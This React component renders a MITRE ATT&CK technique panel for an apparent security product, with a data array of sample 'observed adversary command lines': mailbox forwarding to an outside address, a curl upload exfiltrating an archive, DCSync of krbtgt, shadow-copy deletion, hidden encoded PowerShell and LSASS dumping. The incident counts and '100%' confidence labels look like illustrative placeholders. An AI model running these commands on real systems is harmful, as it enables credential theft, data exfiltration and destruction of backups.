// client/src/components/MitreSection.jsx
// 05 / MITRE ATT&CK EVIDENCE-GROUNDED TECHNIQUE MAPPING
// Displays authoritative techniques mapped with forensic artifacts from actual incidents
import React, { useState } from 'react';

const MITRE_TECHNIQUES = [
  {
    id: 'T1114.002',
    name: 'Remote Email Forwarding Rule',
    tactic: 'Collection',
    subTactic: 'Email Collection',
    incidentsCount: 4,
    evidence: 'New-InboxRule forward target finance-drop@proton.me via Exchange Online PowerShell session',
    command: 'Set-Mailbox -Identity "marcus.vance" -ForwardingSmtpAddress "finance-drop@proton.me"',
    severity: 'P1 CRITICAL',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1567.002',
    name: 'Cloud Storage Exfiltration (mega.nz)',
    tactic: 'Exfiltration',
    subTactic: 'Exfiltration to Cloud',
    incidentsCount: 3,
    evidence: '5,153,960,755 bytes outbound HTTPS stream to 185.220.101.5 (mega.nz API ASN)',
    command: 'curl -T archive_q3.tar.gz https://giga.nz/api/v2/upload -H "Authorization: Bearer..."',
    severity: 'P1 CRITICAL',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1078.002',
    name: 'Domain Accounts Abuse (DCSync)',
    tactic: 'Defense Evasion',
    subTactic: 'Valid Accounts',
    incidentsCount: 6,
    evidence: 'RPC bind to Directory Replication Service endpoint from svc-replication account on non-DC host',
    command: 'lsadump::dcsync /domain:corp.internal /user:krbtgt',
    severity: 'P1 CRITICAL',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1490',
    name: 'Inhibit System Recovery (vssadmin)',
    tactic: 'Impact',
    subTactic: 'Defensive Evasion',
    incidentsCount: 2,
    evidence: 'Shadow copy deletion command invoked via cmd.exe spawned by wmic shadowcopy delete',
    command: 'vssadmin.exe delete shadows /all /quiet && bcdedit /set {default} recoveryenabled No',
    severity: 'P1 CRITICAL',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1566.001',
    name: 'Spearphishing Attachment',
    tactic: 'Initial Access',
    subTactic: 'Phishing',
    incidentsCount: 5,
    evidence: 'Q3_Financial_Audit.xlsm macro payload dropped into AppData\\Local\\Temp with obfuscated VBA',
    command: 'WINWORD.EXE /n "Q3_Financial_Audit.xlsm" -> spawned powershell.exe -enc JABzAD0...',
    severity: 'P2 HIGH',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1059.001',
    name: 'PowerShell Execution',
    tactic: 'Execution',
    subTactic: 'Command & Scripting',
    incidentsCount: 8,
    evidence: 'Encoded PowerShell command bypassed execution policy with hidden window style',
    command: 'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
    severity: 'P2 HIGH',
    confidence: '100% EVIDENCE-GROUNDED',
  },
  {
    id: 'T1003.001',
    name: 'LSASS Memory Dumping',
    tactic: 'Credential Access',
    subTactic: 'OS Credential Dumping',
    incidentsCount: 4,
    evidence: 'MiniDumpWriteDump API called against lsass.exe process handle with handle rights 0x1FFFFF',
    command: 'rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full',
    severity: 'P1 CRITICAL',
    confidence: '100% EVIDENCE-GROUNDED',
  },
];

export function MitreSection() {
  const [selectedTech, setSelectedTech] = useState(MITRE_TECHNIQUES[0]);
  const [tacticFilter, setTacticFilter] = useState('ALL');

  const tactics = ['ALL', 'Initial Access', 'Execution', 'Defense Evasion', 'Credential Access', 'Collection', 'Exfiltration', 'Impact'];

  const filtered = MITRE_TECHNIQUES.filter(
    (t) => tacticFilter === 'ALL' || t.tactic.toLowerCase() === tacticFilter.toLowerCase()
  );

  return (
    <section className="sentinel-section mitre-section" id="mitre-attack">
      <div className="section-inner-container">
        {/* Header */}
        <div className="section-header-block">
          <div className="section-eyebrow-tag mono">
            <span className="code-accent">04</span>
            <span className="code-sep">/</span>
            <span>05 / MITRE ATT&amp;CK TECHNIQUE ATTRIBUTION</span>
          </div>
          <div className="section-headline-row flex-between">
            <h2 className="section-title-large">
              EVIDENCE-GROUNDED MAPPING.
            </h2>
            <p className="section-description-text">
              Every technique tag is anchored in concrete process command-lines, API calls, or egress network evidence. Speculative heuristic tagging is strictly rejected.
            </p>
          </div>
        </div>

        {/* Tactic Filter Tabs */}
        <div className="tactic-filters-strip mono">
          {tactics.map((tac) => (
            <button
              key={tac}
              className={`tactic-filter-btn ${tacticFilter === tac ? 'active' : ''}`}
              onClick={() => setTacticFilter(tac)}
            >
              {tac}
            </button>
          ))}
        </div>

        {/* Master-Detail MITRE View */}
        <div className="mitre-master-detail-grid">
          {/* Left: Technique List */}
          <div className="mitre-tech-list-card">
            {filtered.map((tech) => {
              const isSelected = selectedTech.id === tech.id;
              return (
                <div
                  key={tech.id}
                  className={`mitre-tech-row flex-between ${isSelected ? 'selected' : ''}`}
                  onClick={() => setSelectedTech(tech)}
                >
                  <div className="tech-row-left">
                    <span className="tech-id-tag mono">{tech.id}</span>
                    <div>
                      <div className="tech-name-text">{tech.name}</div>
                      <span className="tech-tactic-text mono">{tech.tactic}</span>
                    </div>
                  </div>

                  <div className="tech-row-right mono">
                    <span className="tech-count-badge">{tech.incidentsCount} INCIDENTS</span>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Right: Selected Technique Forensic Evidence Spec */}
          <div className="mitre-detail-spec-card">
            <div className="spec-top flex-between mono">
              <span className="spec-tech-id">{selectedTech.id}</span>
              <span className="spec-confidence-pill">{selectedTech.confidence}</span>
            </div>

            <h3 className="spec-title">{selectedTech.name}</h3>
            
            <div className="spec-meta-bar mono flex-between">
              <div>
                <span className="meta-label">TACTIC</span>
                <b className="meta-val text-cyan">{selectedTech.tactic}</b>
              </div>
              <div>
                <span className="meta-label">SUB-TACTIC</span>
                <b className="meta-val text-white">{selectedTech.subTactic}</b>
              </div>
              <div>
                <span className="meta-label">ASSOCIATED RISK</span>
                <b className="meta-val text-red">{selectedTech.severity}</b>
              </div>
            </div>

            <div className="spec-evidence-block">
              <span className="evidence-title mono">FORENSIC TELEMETRY PROOF</span>
              <p className="evidence-text mono">{selectedTech.evidence}</p>
            </div>

            <div className="spec-command-block">
              <span className="command-title mono">OBSERVED ADVERSARY COMMAND LINE</span>
              <pre className="command-code mono"><code>{selectedTech.command}</code></pre>
            </div>

            <div className="spec-footer-note mono">
              Attribution confirmed by deterministic pattern matcher &bull; MITRE Enterprise Matrix v14
            </div>
          </div>
        </div>

      </div>

      <style>{`
        .mitre-section {
          padding: 5rem 0;
          position: relative;
          z-index: 5;
        }

        .tactic-filters-strip {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          margin-bottom: 2rem;
          overflow-x: auto;
          padding-bottom: 0.5rem;
          scrollbar-width: none;
        }

        .tactic-filter-btn {
          background: rgba(15, 23, 42, 0.6);
          border: 1px solid rgba(255, 255, 255, 0.1);
          color: #94a3b8;
          font-size: 0.68rem;
          font-weight: 700;
          padding: 0.4rem 0.85rem;
          border-radius: 4px;
          cursor: pointer;
          white-space: nowrap;
          transition: all 140ms ease;
        }

        .tactic-filter-btn:hover {
          color: #ffffff;
          border-color: rgba(56, 189, 248, 0.35);
        }

        .tactic-filter-btn.active {
          background: rgba(56, 189, 248, 0.15);
          border-color: #38bdf8;
          color: #38bdf8;
        }

        .mitre-master-detail-grid {
          display: grid;
          grid-template-columns: 1fr 1.15fr;
          gap: 2rem;
        }

        .mitre-tech-list-card, .mitre-detail-spec-card {
          background: rgba(7, 12, 18, 0.7);
          backdrop-filter: blur(28px);
          -webkit-backdrop-filter: blur(28px);
          border: 1px solid rgba(255, 255, 255, 0.09);
          border-radius: 8px;
          padding: 1.5rem;
        }

        .mitre-tech-list-card {
          display: flex;
          flex-direction: column;
          gap: 0.5rem;
        }

        .mitre-tech-row {
          padding: 0.85rem 1rem;
          background: rgba(15, 23, 42, 0.5);
          border: 1px solid rgba(255, 255, 255, 0.05);
          border-radius: 4px;
          cursor: pointer;
          transition: all 140ms ease;
        }

        .mitre-tech-row:hover {
          background: rgba(56, 189, 248, 0.08);
          border-color: rgba(56, 189, 248, 0.25);
        }

        .mitre-tech-row.selected {
          background: rgba(56, 189, 248, 0.15);
          border-color: #38bdf8;
          box-shadow: 0 0 15px rgba(56, 189, 248, 0.15);
        }

        .tech-row-left {
          display: flex;
          align-items: center;
          gap: 0.85rem;
        }

        .tech-id-tag {
          font-size: 0.68rem;
          font-weight: 700;
          color: #38bdf8;
          min-width: 65px;
        }

        .tech-name-text {
          font-size: 0.82rem;
          font-weight: 600;
          color: #ffffff;
        }

        .tech-tactic-text {
          font-size: 0.62rem;
          color: #64748b;
        }

        .tech-count-badge {
          font-size: 0.62rem;
          color: #94a3b8;
          background: rgba(255, 255, 255, 0.05);
          padding: 0.2rem 0.5rem;
          border-radius: 3px;
        }

        .mitre-detail-spec-card {
          display: flex;
          flex-direction: column;
          gap: 1.25rem;
        }

        .spec-top {
          font-size: 0.72rem;
        }

        .spec-tech-id {
          font-size: 1.1rem;
          font-weight: 800;
          color: #38bdf8;
        }

        .spec-confidence-pill {
          padding: 0.25rem 0.65rem;
          background: rgba(16, 185, 129, 0.12);
          border: 1px solid rgba(16, 185, 129, 0.35);
          color: #10b981;
          font-size: 0.62rem;
          font-weight: 700;
          border-radius: 999px;
        }

        .spec-title {
          font-size: 1.35rem;
          font-weight: 700;
          color: #ffffff;
          margin: 0;
        }

        .spec-meta-bar {
          background: rgba(15, 23, 42, 0.6);
          padding: 0.75rem 1rem;
          border-radius: 4px;
          border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .meta-label { font-size: 0.58rem; color: #64748b; display: block; margin-bottom: 0.2rem; }
        .meta-val { font-size: 0.78rem; }

        .spec-evidence-block, .spec-command-block {
          display: flex;
          flex-direction: column;
          gap: 0.4rem;
        }

        .evidence-title, .command-title {
          font-size: 0.62rem;
          color: #64748b;
          font-weight: 700;
          letter-spacing: 0.12em;
        }

        .evidence-text {
          background: rgba(5, 8, 12, 0.6);
          border: 1px solid rgba(255, 255, 255, 0.08);
          border-radius: 4px;
          padding: 0.85rem;
          font-size: 0.72rem;
          color: #e2e8f0;
          line-height: 1.5;
          margin: 0;
        }

        .command-code {
          background: #030609;
          border: 1px solid rgba(56, 189, 248, 0.25);
          border-radius: 4px;
          padding: 0.85rem;
          font-size: 0.72rem;
          color: #38bdf8;
          overflow-x: auto;
          margin: 0;
        }

        .spec-footer-note {
          font-size: 0.65rem;
          color: #64748b;
          border-top: 1px dashed rgba(255, 255, 255, 0.08);
          padding-top: 0.85rem;
          margin-top: auto;
        }

        @media (max-width: 900px) {
          .mitre-master-detail-grid {
            grid-template-columns: 1fr;
          }
        }
      `}</style>
    </section>
  );
}
export default MitreSection;
